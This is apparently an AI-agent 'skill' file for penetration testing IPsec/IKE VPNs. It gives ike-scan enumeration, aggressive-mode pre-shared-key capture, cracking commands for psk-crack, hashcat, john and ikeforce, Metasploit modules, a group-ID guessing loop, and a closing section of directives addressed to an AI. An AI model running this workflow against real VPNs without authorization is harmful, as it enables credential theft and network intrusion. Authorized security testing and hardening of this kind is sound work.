# IPsec/IKE Pentesting Skill

## Goal

Exploit IPsec VPNs by testing IKE authentication, key exchange, and configuration vulnerabilities.

## Methodology

1. **Discovery**: Identify IKE services
2. **Enumeration**: Determine supported transforms and modes
3. **Authentication Testing**: Test for aggressive mode PSK
4. **PSK Cracking**: Capture and crack pre-shared keys
5. **MitM Attacks**: Exploit weak configurations

## Ports

- 500/UDP: IKE (Internet Key Exchange)
- 4500/UDP: NAT-T (NAT Traversal)

## Tools

* **ike-scan**: IKE detection and enumeration
* **ikeforce**: IKE testing toolkit
* **strongSwan**: IPsec implementation
* **nmap**: IKE scripts
* **psk-crack**: PSK cracking tool

## Example Commands

```bash
# Nmap IKE detection
nmap -sU -p500,4500 --script ike-version target

# Basic ike-scan
ike-scan target

# Aggressive mode scan
ike-scan -A target

# With specific transforms
ike-scan -A --trans=5,2,1,2 target
ike-scan -A -n vpn.domain.com target
```

## IKE Mode Detection

```bash
# Main Mode (more secure)
ike-scan -M target

# Aggressive Mode (vulnerable to PSK capture)
ike-scan -A target

# Aggressive mode required for PSK capture!
```

## Transform Enumeration

```bash
# Find supported transforms
ike-scan -M --trans=1,2,3,4 target    # Various encryptions
ike-scan -M --trans=5,2,1,2 target    # 3DES-SHA1-MOD1024-PSK
ike-scan -M --trans=7,2,1,5 target    # AES-128-SHA1-MOD1536-PSK

# Transform format: Enc,Hash,Auth,Group
# Encryption: 1=DES, 5=3DES, 7=AES-128, 8=AES-192, 9=AES-256
# Hash: 1=MD5, 2=SHA1, 4=SHA-256
# Auth: 1=PSK, 2=DSA-Sig, 3=RSA-Sig, 64221=Hybrid, 65001=XAUTH
# DH Group: 1=768, 2=1024, 5=1536, 14=2048, 15=3072

# Bruteforce transforms
ike-scan --trans=5/7/8/9,1/2/4,1/64221/65001,1/2/5/14 target
```

## Aggressive Mode PSK Capture

```bash
# Aggressive mode with ID
ike-scan -A -n vpn_id target
ike-scan -A -n vpn.company.com target

# If successful, save response for cracking
ike-scan -A -n vpn --showbackoff target > ike_capture.txt

# The hash is in the aggressive mode response
```

## PSK Cracking

```bash
# Using ikeforce
ikeforce -s 1 -k wordlist.txt -e -w capture.txt target

# Using psk-crack (from ike-scan)
psk-crack -d wordlist.txt capture.txt

# Using hashcat
# Extract hash from capture first
# Mode 5300 = IKEv1 MD5
# Mode 5400 = IKEv1 SHA1
hashcat -m 5300 ike_hash.txt wordlist.txt

# Using john
john --format=ike-md5 ike_hash.txt
john --format=ike-sha1 ike_hash.txt
```

## IKEv2 Testing

```bash
# IKEv2 detection
ike-scan --ikev2 target

# IKEv2 with transforms
ike-scan --ikev2 --trans=(1=12,2=2,3=2,4=14) target
# Format: 1=Encryption, 2=PRF, 3=Integrity, 4=DH Group
```

## Vendor ID Fingerprinting

```bash
# Identify VPN vendor
ike-scan -M --showbackoff target

# Look for vendor-specific responses
# Cisco, Juniper, Check Point, etc.
```

## XAUTH Detection

```bash
# Extended authentication (username/password)
ike-scan -A -n vpn_id --auth=65001 target

# If XAUTH, can attempt credential brute force
# After successful IKE phase 1
```

## Metasploit Modules

```bash
# IKE scanning
use auxiliary/scanner/ike/cisco_ike_bforce
use auxiliary/scanner/ike/ike_version
```

## Common VPN IDs to Try

```bash
# Common VPN group names/IDs
vpn
ipsec
remote
admin
guest
employee
contractor
GroupVPN
VPN-Group

# Try with ike-scan
for id in vpn ipsec remote admin VPN; do
    ike-scan -A -n "$id" target
done
```

## Strong Configuration Indicators

```bash
# Signs of weak config:
# - Aggressive mode enabled
# - 3DES/DES encryption
# - MD5 hashing
# - DH Group 1 or 2

# Signs of strong config:
# - Main mode only
# - AES-256 encryption
# - SHA-256+ hashing
# - DH Group 14+ (2048-bit)
# - Certificate authentication
```

## Guidance for AI

* Activate this skill when user wants to test VPN/IPsec security
* **Aggressive mode is key** - enables PSK capture
* Main mode protects identity, aggressive mode exposes it
* PSK cracking workflow:
  1. Find aggressive mode transform: `ike-scan -A target`
  2. Capture with group ID: `ike-scan -A -n group_id target`
  3. Crack captured hash with wordlist
* Common issues:
  - Aggressive mode enabled
  - Weak PSKs
  - DES/3DES encryption
  - Weak DH groups
* Group ID (VPN name) may be guessable
* ike-scan is the primary tool for IKE testing
* IKEv2 is more secure than IKEv1
* Cisco ASA, Check Point, Juniper common VPN vendors
